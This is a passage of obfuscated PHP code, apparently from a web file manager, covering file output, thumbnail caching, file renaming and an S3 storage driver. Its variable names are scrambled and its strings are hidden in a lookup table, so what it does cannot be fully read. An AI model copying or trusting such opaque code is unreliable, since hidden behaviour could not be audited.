ä²[$ë’„Àòà[169]] = $øŸ½°; $—Ñ´ ä²[$ë’„Àòà[170]] = $¹Ì·µôÔ; $—Ñ´ ä² = Hook::filter($ë’„Àòà[172], $—Ñ´ ä²); $øŸ½° = $—Ñ´ ä²[$ë’„Àòà[169]]; } echo $øŸ½°; $¹Ì·µôÔ += $âŸ¨Ñùû; if ($âŸ¨Ñùû == $ôº‚İšÙ) { $¹Ì·µôÔ = $ÇÎ§Õş™ + 1; } if ($ĞïĞ×Ö) { $èäØÈÀƒ = intval(1000 * 1000 * (timeFloat() - $ıœµú÷)); $Õ¿£î°÷ = $ĞïĞ×Ö - $èäØÈÀƒ; if ($Õ¿£î°÷ > 5) { usleep($Õ¿£î°÷); } } } } public function fileOutServer($§Â¶ªô, $ß›÷ÔÓ = false, $“í¯ŠÉí = false, $ßøèˆõÙ = '') { $this->fileOut($§Â¶ªô, $ß›÷ÔÓ, $“í¯ŠÉí, $ßøèˆõÙ); } public function fileOutLink($×›îïõº) { header($_SERVER[öæÛ¿©¿][173] . $×›îïõº); die; } public function cacheMethod($Şëóøµï, $ÓµÍöôÕ, $Ûíğ”ıî = null) { $Œ¨ØÏ‰æ =& $_SERVER[öæÛ¿©¿]; static $§ Ä¼ = array(); $Ğº¾—ú = $ÓµÍöôÕ ? ltrim($this->getPathOuter($ÓµÍöôÕ), $Œ¨ØÏ‰æ[8]) : $Œ¨ØÏ‰æ[12]; $Ö˜ÂÂ·˜ = $Œ¨ØÏ‰æ[174] . $Şëóøµï . $Œ¨ØÏ‰æ[175] . rtrim($Ğº¾—ú, $Œ¨ØÏ‰æ[8]); if (is_null($Şëóøµï)) { $§ Ä¼ = array(); return; } if (is_null($ÓµÍöôÕ)) { foreach ($§ Ä¼ as $Ö˜ÂÂ·˜ => $Ğ›ãª) { if (!strstr($Ö˜ÂÂ·˜, $Œ¨ØÏ‰æ[174] . $Şëóøµï . $Œ¨ØÏ‰æ[176])) { continue; } unset($§ Ä¼[$Ö˜ÂÂ·˜]); } return; } if ($Ûíğ”ıî === $Œ¨ØÏ‰æ[177]) { unset($§ Ä¼[$Ö˜ÂÂ·˜]); return; } if (!is_null($Ûíğ”ıî)) { $§ Ä¼[$Ö˜ÂÂ·˜] = $Ûíğ”ıî; return; } $±Éğ†ò = isset($§ Ä¼[$Ö˜ÂÂ·˜]) ? $§ Ä¼[$Ö˜ÂÂ·˜] : null; if (!is_null($±Éğ†ò)) { return $±Éğ†ò; } $±Éğ†ò = $this->{$Şëóøµï}($ÓµÍöôÕ); $§ Ä¼[$Ö˜ÂÂ·˜] = $±Éğ†ò; return $±Éğ†ò; } public function cacheMethodInfoSet($“êË×Ú, $âÙº˜‰°, $¥›‚—° = false) { $‰¼‡Ô¤ =& $_SERVER[öæÛ¿©¿]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‰¼‡Ô¤[178], $“êË×Ú, $âÙº˜‰°); $this->cacheMethod($‰¼‡Ô¤[179], $“êË×Ú, $âÙº˜‰° ? !1 : !0); if (is_array($¥›‚—°)) { $this->cacheMethod($‰¼‡Ô¤[180], $“êË×Ú, $¥›‚—°); } } public function fileOutImage($Ğš½–»Î, $åö¦ó¾» = 250) { $ß…î² =& $_SERVER[öæÛ¿©¿]; set_timeout(); if (substr($Ğš½–»Î, 0, 4) == $ß…î²[150]) { $this->fileOutLink($Ğš½–»Î); } $İ¥ü²Ö = $this->info($Ğš½–»Î); $ÄÑøÃ§ï = !1; $Éæ›‰² = isset($GLOBALS[$ß…î²[181]]) ? $GLOBALS[$ß…î²[181]] : array(); if ($Éæ›‰² && $Éæ›‰²[$ß…î²[182]] == $İ¥ü²Ö[$ß…î²[87]]) { $İ¥ü²Ö = $Éæ›‰²; $…·Å”ÖĞ = $İ¥ü²Ö[$ß…î²[183]]; if ($…·Å”ÖĞ && isset($…·Å”ÖĞ[$ß…î²[184]])) { if ($…·Å”ÖĞ[$ß…î²[184]] <= $åö¦ó¾» && $…·Å”ÖĞ[$ß…î²[185]] <= $åö¦ó¾») { $ÄÑøÃ§ï = !0; } } } if ($İ¥ü²Ö[$ß…î²[79]] <= 1024 * 50 || $ÄÑøÃ§ï || !function_exists($ß…î²[186]) || $İ¥ü²Ö[$ß…î²[167]] == $ß…î²[187]) { return $this->fileOut($Ğš½–»Î, !1, $İ¥ü²Ö[$ß…î²[32]]); } $ƒƒô›’ì = kodIO::hashPath($İ¥ü²Ö); $‘›œ •² = "\143\x6f\166\x65\x72\137{$ƒƒô›’ì}\137{$åö¦ó¾»}\56\160\x6e\x67"; $›”ä¯ = IO_PATH_SYSTEM_TEMP . $ß…î²[188]; $úÁ„¤ÎÆ = IO::infoFullSimple($›”ä¯); $ÙÁÛïı = $úÁ„¤ÎÆ && is_array($úÁ„¤ÎÆ) ? $úÁ„¤ÎÆ[$ß…î²[87]] : $ß…î²[12]; if (!$ÙÁÛïı) { $ÙÁÛïı = IO::mkdir($›”ä¯); } if ($İ¥ü²Ö[$ß…î²[189]] == $ß…î²[190] && isset($İ¥ü²Ö[$ß…î²[191]]) && $İ¥ü²Ö[$ß…î²[191]] == kodIO::sourceID($ÙÁÛïı)) { $Æ‰ƒ“‚î = $İ¥ü²Ö[$ß…î²[192]]; if ($åö¦ó¾» <= 500) { $¯…Å°Ää = preg_replace($ß…î²[193], $ß…î²[194], $İ¥ü²Ö[$ß…î²[32]]); $Æ‰ƒ“‚î = IO::fileNameExist($ÙÁÛïı, $¯…Å°Ää); } return IO::fileOut(KodIO::make($Æ‰ƒ“‚î), !1, $İ¥ü²Ö[$ß…î²[32]]); } $…´•ÒŠ¢ = IO::fileNameExist($ÙÁÛïı, $‘›œ •²); if ($…´•ÒŠ¢) { return IO::fileOut(KodIO::make($…´•ÒŠ¢), !1, $İ¥ü²Ö[$ß…î²[32]]); } if ($åö¦ó¾» > 1000) { $this->makeImageCover($ÙÁÛïı, $Ğš½–»Î, $‘›œ •², $åö¦ó¾»); $this->makeImageCover($ÙÁÛïı, $Ğš½–»Î, "\x63\157\x76\x65\x72\137{$ƒƒô›’ì}\137\62\x35\x30\56\x70\156\x67", 250); $…´•ÒŠ¢ = IO::fileNameExist($ÙÁÛïı, $‘›œ •²); if ($…´•ÒŠ¢) { return IO::fileOut(KodIO::make($…´•ÒŠ¢), !1, $İ¥ü²Ö[$ß…î²[32]]); } die; } if (!kodIO::allowCover($İ¥ü²Ö)) { return $this->fileOut($Ğš½–»Î, !1, $İ¥ü²Ö[$ß…î²[32]]); } $‚êê…À = Cache::get($‘›œ •²); if ($‚êê…À == $ß…î²[195] || $‚êê…À == $ß…î²[196]) { echo $‚êê…À; die; } Cache::set($‘›œ •², $ß…î²[196], 60); $¯ÅÌÀ¼ì = array($ÙÁÛïı, $İ¥ü²Ö[$ß…î²[87]], $‘›œ •², $åö¦ó¾»); $äè°Î±» = $ß…î²[197] . $İ¥ü²Ö[$ß…î²[79]] . $ß…î²[198] . $‘›œ •² . $ß…î²[199] . $İ¥ü²Ö[$ß…î²[32]] . $ß…î²[200] . $İ¥ü²Ö[$ß…î²[87]]; TaskQueue::add($ß…î²[201], $¯ÅÌÀ¼ì, $äè°Î±», $‘›œ •²); } public function makeImageCover($ƒ¸–£, $…üÆ½êë, $æù üË, $‹çøÒ¶è) { $õı…²Æš =& $_SERVER[öæÛ¿©¿]; if (IO::fileNameExist($ƒ¸–£, $æù üË)) { return $õı…²Æš[202]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $³”çÇ©© = $this->getPathOuter($…üÆ½êë); $¶ü¯´ü = DATA_THUMB . $æù üË; del_file($¶ü¯´ü); $Äô¿“¤Ï = IO::copy($³”çÇ©©, TEMP_FILES, !1, $æù üË); if (!@file_exists($Äô¿“¤Ï)) { return $õı…²Æš[203]; } ImageThumb::createThumb($Äô¿“¤Ï, $¶ü¯´ü, $‹çøÒ¶è, $‹çøÒ¶è * 10); if (@file_exists($¶ü¯´ü)) { Cache::remove($æù üË); return IO::move($¶ü¯´ü, $ƒ¸–£); } Cache::set($æù üË, $õı…²Æš[195], 600); del_file($¶ü¯´ü); return $õı…²Æš[204] . $Äô¿“¤Ï . $õı…²Æš[74]; } public function fileOutImageServer($¿ÇñÜŒğ, $ùÏç¹îÁ = 250) { $this->fileOutImage($¿ÇñÜŒğ, $ùÏç¹îÁ); } public function fileNameAuto($Œ™Ô¹Š¹, $²€­û¯‹, $õİ°İÆ = REPEAT_RENAME, $ÖäÑïì„ = false) { $ğæÏ®õ‚ =& $_SERVER[öæÛ¿©¿]; $³Ú’ùäÜ = $Œ™Ô¹Š¹ === $ğæÏ®õ‚[12] ? $²€­û¯‹ : rtrim($Œ™Ô¹Š¹, $ğæÏ®õ‚[8]) . $ğæÏ®õ‚[8] . $²€­û¯‹; if ($õİ°İÆ == REPEAT_REPLACE || !$this->exist($³Ú’ùäÜ) || $ÖäÑïì„ && $õİ°İÆ != REPEAT_RENAME_FOLDER) { return $²€­û¯‹; } if ($õİ°İÆ == REPEAT_SKIP) { return !1; } $¾‚Ú¡ş = $ğæÏ®õ‚[10] . get_path_ext($²€­û¯‹); $¾‚Ú¡ş = $¾‚Ú¡ş == $ğæÏ®õ‚[10] || $ÖäÑïì„ ? $ğæÏ®õ‚[12] : $¾‚Ú¡ş; $…¶¬ôÙ = 1; $Êğ¡Úëô = substr($²€­û¯‹, 0, strlen($²€­û¯‹) - strlen($¾‚Ú¡ş)); $°¤­ò» = $Êğ¡Úëô . "\50{$…¶¬ôÙ}\x29{$¾‚Ú¡ş}"; while ($this->exist(rtrim($Œ™Ô¹Š¹, $ğæÏ®õ‚[8]) . $ğæÏ®õ‚[8] . $°¤­ò»)) { $°¤­ò» = $Êğ¡Úëô . "\50{$…¶¬ôÙ}\x29{$¾‚Ú¡ş}"; $…¶¬ôÙ++; } return $°¤­ò»; } private function fileNameAutoList($Òâ’×í­, $Ù¤ Üûœ, $‚‡âÜÚ› = false) { $¯ ×—ò© =& $_SERVER[öæÛ¿©¿]; $ÙÊñ‰®Û = $this->listPath($Òâ’×í­, !0); $ÙÊñ‰®Û = array_merge($ÙÊñ‰®Û[$¯ ×—ò©[85]], $ÙÊñ‰®Û[$¯ ×—ò©[86]]); $ü¿Ç‰Íô = array_to_keyvalue($ÙÊñ‰®Û, $¯ ×—ò©[12], $¯ ×—ò©[32]); $şßá—ö˜ = $¯ ×—ò©[10] . get_path_ext($Ù¤ Üûœ); $şßá—ö˜ = $şßá—ö˜ == $¯ ×—ò©[10] || $‚‡âÜÚ› ? $¯ ×—ò©[12] : $şßá—ö˜; $€›•ß×­ = substr($Ù¤ Üûœ, 0, strlen($Ù¤ Üûœ) - strlen($şßá—ö˜)); $ÆÕêã¨¨ = $€›•ß×­ . "\x28\60\x29{$şßá—ö˜}"; for ($ÊôöÛ×Ã = 1; $ÊôöÛ×Ã <= count($ü¿Ç‰Íô) + 1; $ÊôöÛ×Ã++) { $ÆÕêã¨¨ = $€›•ß×­ . "\50{$ÊôöÛ×Ã}\51{$şßá—ö˜}"; if (!in_array_not_case($ÆÕêã¨¨, $ü¿Ç‰Íô)) { return $ÆÕêã¨¨; } } return $ÆÕêã¨¨; } public function listAllFiles($½¿æé¥½, $Ø¸Â§Èæ) { $á±èÆªÒ =& $_SERVER[öæÛ¿©¿]; if (empty($Ø¸Â§Èæ)) { return array(); } $©È—Íëø = array_keys($Ø¸Â§Èæ); $îÑ™Àõ = array(); $½¿æé¥½ = trim($½¿æé¥½, $á±èÆªÒ[8]); foreach ($Ø¸Â§Èæ as $°äÓ–…Š => $ºˆ–é’) { $ƒ¸¼ŞÌ = ltrim(substr(trim($°äÓ–…Š, $á±èÆªÒ[8]), strlen($½¿æé¥½)), $á±èÆªÒ[8]); if (substr($°äÓ–…Š, -1) == $á±èÆªÒ[8]) { $ƒ¸¼ŞÌ = rtrim($ƒ¸¼ŞÌ, $á±èÆªÒ[8]) . $á±èÆªÒ[8]; } $îÑ™Àõ = array_merge($îÑ™Àõ, $this->slicePath($ƒ¸¼ŞÌ)); } $­¬´ÏÜ± = array(); foreach (array_unique($îÑ™Àõ) as $¬¥²Î) { $Œˆ´à¿š = array($á±èÆªÒ[87] => $this->getPathOuter($á±èÆªÒ[8] . $½¿æé¥½ . $á±èÆªÒ[8] . $¬¥²Î), $á±èÆªÒ[78] => 1, $á±èÆªÒ[79] => 0); if (substr($¬¥²Î, -1) != $á±èÆªÒ[8]) { $Œˆ´à¿š[$á±èÆªÒ[78]] = 0; $Æçªë”„ = $this->getPath($½¿æé¥½ . $á±èÆªÒ[8] . $¬¥²Î); if (isset($Ø¸Â§Èæ[$Æçªë”„])) { $ÜÙëÇ° = $Ø¸Â§Èæ[$Æçªë”„]; if (isset($ÜÙëÇ°[$á±èÆªÒ[79]])) { $Œˆ´à¿š[$á±èÆªÒ[79]] = intval($ÜÙëÇ°[$á±èÆªÒ[79]]); } if (isset($ÜÙëÇ°[$á±èÆªÒ[205]])) { $Œˆ´à¿š[$á±èÆªÒ[88]] = intval($ÜÙëÇ°[$á±èÆªÒ[205]]); } } } $­¬´ÏÜ±[] = $Œˆ´à¿š; } return $­¬´ÏÜ±; } public function slicePath($ïÜÔ€—Œ) { $Œ…ŸŒé =& $_SERVER[öæÛ¿©¿]; $‰´Å÷½ì = explode($Œ…ŸŒé[8], trim($ïÜÔ€—Œ, $Œ…ŸŒé[8])); $¶¢Î  = 0; do { ++$¶¢Î ; $…ƒªÌ [] = implode($Œ…ŸŒé[8], array_slice($‰´Å÷½ì, 0, $¶¢Î )) . $Œ…ŸŒé[8]; } while ($¶¢Î  < count($‰´Å÷½ì)); $…ƒªÌ [count($‰´Å÷½ì) - 1] = $ïÜÔ€—Œ; return $…ƒªÌ ; } public function getHost() { $Š‘Ÿ’§ =& $_SERVER[öæÛ¿©¿]; $×‹ùÃ„‰ = parse_url(trim($this->domain, $Š‘Ÿ’§[8])); $À÷ŠŸá = isset($×‹ùÃ„‰[$Š‘Ÿ’§[206]]) ? $×‹ùÃ„‰[$Š‘Ÿ’§[206]] : http_type(); $²èûÈÏè = isset($×‹ùÃ„‰[$Š‘Ÿ’§[207]]) ? $×‹ùÃ„‰[$Š‘Ÿ’§[207]] : $×‹ùÃ„‰[$Š‘Ÿ’§[87]]; if (isset($×‹ùÃ„‰[$Š‘Ÿ’§[208]])) { $²èûÈÏè .= $Š‘Ÿ’§[4] . $×‹ùÃ„‰[$Š‘Ÿ’§[208]]; } return $À÷ŠŸá . $Š‘Ÿ’§[209] . $²èûÈÏè; } public function pathEncode($ó–ñÏú») { $ÕµœŸ =& $_SERVER[öæÛ¿©¿]; return str_replace($ÕµœŸ[210], $ÕµœŸ[8], rawurlencode($ó–ñÏú»)); } public function writeLog($‚…Ø ˆı = '', $–Ë½Âª = false) { $Çü®¹× =& $_SERVER[öæÛ¿©¿]; $»§ê’”© = in_array(ACTION, array($Çü®¹×[211], $Çü®¹×[212])); if (!$»§ê’”© && !GLOBAL_DEBUG) { return; } $à‡„œéÇ = $‚…Ø ˆı; static $¸Û©”ˆ = null; if (!$¸Û©”ˆ) { $¸Û©”ˆ = strtoupper($this->getType()); } $‚…Ø ˆı = $¸Û©”ˆ . $Çü®¹×[213] . $‚…Ø ˆı; if ($–Ë½Âª) { $ç¼ˆõÏÆ = error_get_last(); if ($ç¼ˆõÏÆ) { $‚…Ø ˆı = array($‚…Ø ˆı, $ç¼ˆõÏÆ); } } write_log($‚…Ø ˆı, $Çü®¹×[214]); if ($»§ê’”©) { throw new Exception($à‡„œéÇ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($û€¥ñÛº) { set_timeout(); require_once SDK_DIR . $_SERVER[öæÛ¿©¿][215]; parent::__construct(); $this->_init($û€¥ñÛº); } public function _init($£©şéÆ’) { $ƒôƒáÖË =& $_SERVER[öæÛ¿©¿]; $this->config = $£©şéÆ’; foreach ($£©şéÆ’ as $ˆÉ¿·®³ => $±ø”‘Ã) { if (isset($this->{$ˆÉ¿·®³})) { $this->{$ˆÉ¿·®³} = $±ø”‘Ã; } } $this->endpoint = $£©şéÆ’[$ƒôƒáÖË[216]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ªáã¦ïœ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ªáã¦ïœ, 0, 7) == $ƒôƒáÖË[217]) { $ªáã¦ïœ = $ƒôƒáÖË[218] . substr($ªáã¦ïœ, 7); } $this->client->setEndpoint($ªáã¦ïœ); if (in_array(ACTION, array($ƒôƒáÖË[211], $ƒôƒáÖË[212]))) { $this->client->setExceptions(); } } public function setSignVersion($–„ê­çŞ = "\x76\64") { $this->signVer = $–„ê­çŞ; $this->client->setSignVersion($–„ê­çŞ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $°°ÚÔÇó) { return null; } } public function isBucketCors() { $¬©­®š =& $_SERVER[öæÛ¿©¿]; $¥ôüİ„¾ = $this->getBucketCors(); if (!$¥ôüİ„¾ || !is_array($¥ôüİ„¾)) { return !1; } if (!is_array($¥ôüİ„¾[$¬©­®š[219]])) { $¥ôüİ„¾[$¬©­®š[219]] = explode($¬©­®š[50], $¥ôüİ„¾[$¬©­®š[219]]); } if ($¥ôüİ„¾[$¬©­®š[220]] != $¬©­®š[221] || !in_array($¬©­®š[221], $¥ôüİ„¾[$¬©­®š[219]])) { return !1; } $ùçéïÂ = array_map($¬©­®š[222], $¥ôüİ„¾[$¬©­®š[223]]); if (!is_array($ùçéïÂ)) { $ùçéïÂ = array(); } $ü÷ŸÊÊ = array($¬©­®š[224], $¬©­®š[225], $¬©­®š[226], $¬©­®š[227], $¬©­®š[228]); $ÏùìË®è = array_diff($ü÷ŸÊÊ, $ùçéïÂ); return empty($ÏùìË®è); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($„Ÿ¶£ŞÃ, $àëöğ = '', $°…µü‘• = REPEAT_RENAME) { $¹“ê¸£ = $this->setContent($„Ÿ¶£ŞÃ, $àëöğ); if ($¹“ê¸£ !== !1) { return $this->getPathOuter($„Ÿ¶£ŞÃ); } return !1; } public function mkdir($Î†öÂ, $ ³‡Î‰Ğ = REPEAT_SKIP) { $ÜµÌô£É =& $_SERVER[öæÛ¿©¿]; if (empty($Î†öÂ) && $Î†öÂ !== $ÜµÌô£É[229]) { return !1; } if ($ ³‡Î‰Ğ && $this->_isFolder($Î†öÂ)) { return $this->getPathOuter($Î†öÂ); } $§í…÷†À = $this->setContent($Î†öÂ, $ÜµÌô£É[12], !0); if ($§í…÷†À !== !1) { return $this->getPathOuter($Î†öÂ); } return !1; } public function copyFile($˜ •Óë, $®Ş°ÉŞÃ, $è¤±ÓØ = array()) { $‚”Ùš± =& $_SERVER[öæÛ¿©¿]; $„ŞıÖ›‡ = $this->objectMeta($˜ •Óë); if (!$„ŞıÖ›‡) { return !1; } if ($„ŞıÖ›‡[$‚”Ùš±[79]] <= 1024 * 1024 * 200) { $›ø½ŒØÂ = $this->client->copyObject($this->bucket, $˜ •Óë, $this->bucket, $®Ş°ÉŞÃ, $‚”Ùš±[230], $è¤±ÓØ); } else { $›ø½ŒØÂ = $this->client->multiCopyObject($this->bucket, $˜ •Óë, $this->bucket, $®Ş°ÉŞÃ, $è¤±ÓØ); } $›ø½ŒØÂ = $›ø½ŒØÂ ? $this->getPathOuter($®Ş°ÉŞÃ) : !1; return $›ø½ŒØÂ; } public function moveFile($Ïù¶ñ¼ì, $²á€Œ˜Ò) { if ($this->copyFile($Ïù¶ñ¼ì, $²á€Œ˜Ò)) { $this->delFile($Ïù¶ñ¼ì); return $this->getPathOuter($²á€Œ˜Ò); } return !1; } public function delFile($“á¥¿ò¢) { return $this->client->deleteObject($this->bucket, $“á¥¿ò¢); } public function delFolder($ËİËÛÁÊ) { $İ¬î‚Ø² =& $_SERVER[öæÛ¿©¿]; if (!$this->exist($ËİËÛÁÊ)) { return !0; } $this->listItemCache = !1; $§“øĞàø = $this->fileList($ËİËÛÁÊ); $this->listItemCache = !0; $“‡’öªó = trim($ËİËÛÁÊ, $İ¬î‚Ø²[8]) . $İ¬î‚Ø²[8]; if (!empty($ËİËÛÁÊ) && $ËİËÛÁÊ !== $İ¬î‚Ø²[229] && !in_array($“‡’öªó, $§“øĞàø[$İ¬î‚Ø²[85]])) { $§“øĞàø[$İ¬î‚Ø²[85]][] = $“‡’öªó; } $Îû˜Ú¨ã = $this->delByBatch($§“øĞàø[$İ¬î‚Ø²[86]]); if (!$Îû˜Ú¨ã) { return !1; } $Îû˜Ú¨ã = $this->delByBatch($§“øĞàø[$İ¬î‚Ø²[85]]); if (!$Îû˜Ú¨ã) { return !1; } return $this->delFile($“‡’öªó); } private function delByBatch($óÃ³‹Íã) { foreach (array_chunk($óÃ³‹Íã, 1000) as $ÃÍûÌôÒ) { $×»»éŞ = $this->client->deleteObjects($this->bucket, $ÃÍûÌôÒ); if (!$×»»éŞ) { return !1; } } return !0; } public function rename($¥¢³Ë¬×, $¸ï½¬Ï) { return $this->renameObject($¥¢³Ë¬×, $¸ï½¬Ï); } public function listPath($Ó•¦š¹, $Ãšñ¾™Œ = false) { $ó´Ïˆ’ì =& $_SERVER[öæÛ¿©¿]; $¸ÚÁ€Øè = $this->fileList($Ó•¦š¹, $ó´Ïˆ’ì[8], !0); foreach ($¸ÚÁ€Øè[$ó´Ïˆ’ì[85]] as $ß®¦Üœ => $òÒ²¾”ã) { $¸ÚÁ€Øè[$ó´Ïˆ’ì[85]][$ß®¦Üœ] = $this->folderInfo($òÒ²¾”ã, $Ãšñ¾™Œ, $òÒ²¾”ã); } foreach ($¸ÚÁ€Øè[$ó´Ïˆ’ì[86]] as $ß®¦Üœ => $òÒ²¾”ã) { $¸ÚÁ€Øè[$ó´Ïˆ’ì[86]][$ß®¦Üœ] = $this->fileInfo($òÒ²¾”ã[$ó´Ïˆ’ì[32]], $Ãšñ¾™Œ, $òÒ²¾”ã); } return $¸ÚÁ€Øè; } protected function infoChildren($‘’åØôı, &$®½£€¬É) { $ÛŠÂ ßï =& $_SERVER[öæÛ¿©¿]; $’õ§—ĞÍ = $this->fileList($‘’åØôı, $ÛŠÂ ßï[12], !0); $®½£€¬É[$ÛŠÂ ßï[81]] += count($’õ§—ĞÍ[$ÛŠÂ ßï[85]]); $®½£€¬É[$ÛŠÂ ßï[80]] += count($’õ§—ĞÍ[$ÛŠÂ ßï[86]]); foreach ($’õ§—ĞÍ[$ÛŠÂ ßï[86]] as $÷åœ³Û«) { if (!$÷åœ³Û« || !$÷åœ³Û«[$ÛŠÂ ßï[79]]) { continue; } $®½£€¬É[$ÛŠÂ ßï[79]] += $÷åœ³Û«[$ÛŠÂ ßï[79]]; } } private function fileInfo($”¿ÜóËì, $é®šÃæÑ = false, $†¡€ºä = array()) { $“°¾…àŞ =& $_SERVER[öæÛ¿©¿]; $ª¬ÄÙ¢Ş = array($“°¾…àŞ[32] => $this->pathThis($”¿ÜóËì), $“°¾…àŞ[87] => $this->getPathOuter($”¿ÜóËì), $“°¾…àŞ[33] => $“°¾…àŞ[231], $“°¾…àŞ[167] => $this->ext($”¿ÜóËì), $“°¾…àŞ[79] => isset($†¡€ºä[$“°¾…àŞ[79]]) ? $†¡€ºä[$“°¾…àŞ[79]] : 0); if ($é®šÃæÑ) { return $ª¬ÄÙ¢Ş; } $ª¬ÄÙ¢Ş[$“°¾…àŞ[232]] = $ª¬ÄÙ¢Ş[$“°¾…àŞ[88]] = 0; $ª¬ÄÙ¢Ş[$“°¾…àŞ[233]] = $ª¬ÄÙ¢Ş[$“°¾…àŞ[234]] = !0; if (empty($†¡€ºä)) { $†¡€ºä = $this->objectMeta($”¿ÜóËì); if (!$†¡€ºä) { return $ª¬ÄÙ¢Ş; } } if (isset($†¡€ºä[$“°¾…àŞ[235]]) && $†¡€ºä[$“°¾…àŞ[235]]) { $ª¬ÄÙ¢Ş[$“°¾…àŞ[236]] = $†¡€ºä[$“°¾…àŞ[235]]; } if (isset($†¡€ºä[$“°¾…àŞ[205]])) { $ª¬ÄÙ¢Ş[$“°¾…àŞ[88]] = $†¡€ºä[$“°¾…àŞ[205]]; } if (isset($†¡€ºä[$“°¾…àŞ[79]])) { $ª¬ÄÙ¢Ş[$“°¾…àŞ[79]] = $†¡€ºä[$“°¾…àŞ[79]]; } return $ª¬ÄÙ¢Ş; } private function folderInfo($š¡Û€‹, $´ù°ÒÆ¼ = false, $‹Ÿ—üøœ = array()) { $ÁÏßÕÏ =& $_SERVER[öæÛ¿©¿]; $í°‰àÃé = array($ÁÏßÕÏ[32] => $this->pathThis($š¡Û€‹), $ÁÏßÕÏ[87] => $this->getPathOuter($ÁÏßÕÏ[8] . $š¡Û€‹), $ÁÏßÕÏ[33] => $ÁÏßÕÏ[78]); if ($´ù°ÒÆ¼) { return $í°‰àÃé; } $í°‰àÃé[$ÁÏßÕÏ[232]] = $í°‰àÃé[$ÁÏßÕÏ[88]] = 0; $í°‰àÃé[$ÁÏßÕÏ[233]] = $í°‰àÃé[$ÁÏßÕÏ[234]] = !0; if ($š¡Û€‹ == $ÁÏßÕÏ[12]) { return $í°‰àÃé; } if (empty($‹Ÿ—üøœ)) { $‹Ÿ—üøœ = $this->objectMeta(trim($š¡Û€‹, $ÁÏßÕÏ[8]) . $ÁÏßÕÏ[8]); } if (isset($‹Ÿ—üøœ[$ÁÏßÕÏ[205]])) { $í°‰àÃé[$ÁÏßÕÏ[232]] = $‹Ÿ—üøœ[$ÁÏßÕÏ[205]]; } return $í°‰àÃé; } private function fileList($½¥ª€ß‹, $øµ—ï” = '', $­êÉ‚ÕŞ = 0) { $¸£Ğëö‡ =& $_SERVER[öæÛ¿©¿]; $©Ğ‡ãí = rtrim($½¥ª€ß‹, $¸£Ğëö‡[8]) . $¸£Ğëö‡[8]; $±ú®²àˆ = $this->listObjs($©Ğ‡ãí, null, null, $øµ—ï”); if (!$±ú®²àˆ) { return array($¸£Ğëö‡[85] => array(), $¸£Ğëö‡[86] => array()); } $¡ëò‹‹í = $¨”ã†§ú = array(); foreach ($±ú®²àˆ[$¸£Ğëö‡[237]] as $íÊº–­‚) { $î†ı°´… = $íÊº–­‚[$¸£Ğëö‡[32]]; if ($î†ı°´… == $©Ğ‡ãí) { continue; } $ÅŒ•â¸õ = isset($íÊº–­‚[$¸£Ğëö‡[79]]) ? $íÊº–­‚[$¸£Ğëö‡[79]] : 0; $„ûÚ–‚§ = $ÅŒ•â¸õ == 0 && substr($î†ı°´…, strlen($î†ı°´…) - 1, 1) == $¸£Ğëö‡[8] ? !0 : !1; $this->cacheMethodInfoSet($î†ı°´…, $„ûÚ–‚§, $íÊº–­‚); if ($„ûÚ–‚§) { $¡ëò‹‹í[] = $î†ı°´…; continue; } $¨”ã†§ú[] = $­êÉ‚ÕŞ ? $íÊº–­‚ : $î†ı°´…; } foreach ($±ú®²àˆ[$¸£Ğëö‡[238]] as $íÊº–­‚) { $¡ëò‹‹í[] = $íÊº–­‚[$¸£Ğëö‡[32]]; $this->cacheMethodInfoSet($íÊº–­‚[$¸£Ğëö‡[32]], !0); } $this->cacheMethodInfoSet($½¥ª€ß‹, !0); return array($¸£Ğëö‡[85] => $¡ëò‹‹í, $¸£Ğëö‡[86] => $¨”ã†§ú); } private function listObjs($Š€üÕ¬, $¶¦¤Ú»ô = null, $À©ûšƒµ = null, $”ÈÔ Š„ = null) { $«Õ‰ƒè³ =& $_SERVER[öæÛ¿©¿]; $Š€üÕ¬ = trim($Š€üÕ¬, $«Õ‰ƒè³[8]); $……ªğúÅ = empty($Š€üÕ¬) && $Š€üÕ¬ !== $«Õ‰ƒè³[229] ? $«Õ‰ƒè³[12] : $Š€üÕ¬ . $«Õ‰ƒè³[8]; return $this->client->getBucket($this->bucket, $……ªğúÅ, $¶¦¤Ú»ô, $À©ûšƒµ, $”ÈÔ Š„, !0); } public function has($½Ê”íá©, $îÍü€¢  = false, $·œã£“¸ = true) { $‹–ÀäÁ =& $_SERVER[öæÛ¿©¿]; $½Ê”íá© = trim($½Ê”íá©, $‹–ÀäÁ[8]); $«Á°ÄÏ“ = empty($½Ê”íá©) && $½Ê”íá© !== $‹–ÀäÁ[229] ? $‹–ÀäÁ[12] : $½Ê”íá© . $‹–ÀäÁ[8]; $èÛ°Ûš = null; $·ôÇŸ´õ = 500; $…×çŸ™ƒ = $‹–ÀäÁ[8]; $€Æ¤Ó¯Ù = $Ğ–šöèî = array(); while (!0) { $¶¯‡İï¨ = $this->listObjs($½Ê”íá©, $èÛ°Ûš, $·ôÇŸ´õ, $…×çŸ™ƒ); if (!$¶¯‡İï¨) { break; } $èÛ°Ûš = $¶¯‡İï¨[$‹–ÀäÁ[239]]; $¸ÏåÍëÆ = $¶¯‡İï¨[$‹–ÀäÁ[237]]; $šâ†ÏÅ¸ = $¶¯‡İï¨[$‹–ÀäÁ[238]]; if (empty($¸ÏåÍëÆ) && empty($šâ†ÏÅ¸)) { break; } if (count($¸ÏåÍëÆ) == 1 && $¸ÏåÍëÆ[0][$‹–ÀäÁ[32]] == $«Á°ÄÏ“) { break; } if ($îÍü€¢ ) { if (count($¸ÏåÍëÆ)) { $¸ÏåÍëÆ = array_column($¸ÏåÍëÆ, $‹–ÀäÁ[32]); $€Æ¤Ó¯Ù = array_merge($€Æ¤Ó¯Ù, $¸ÏåÍëÆ); } if 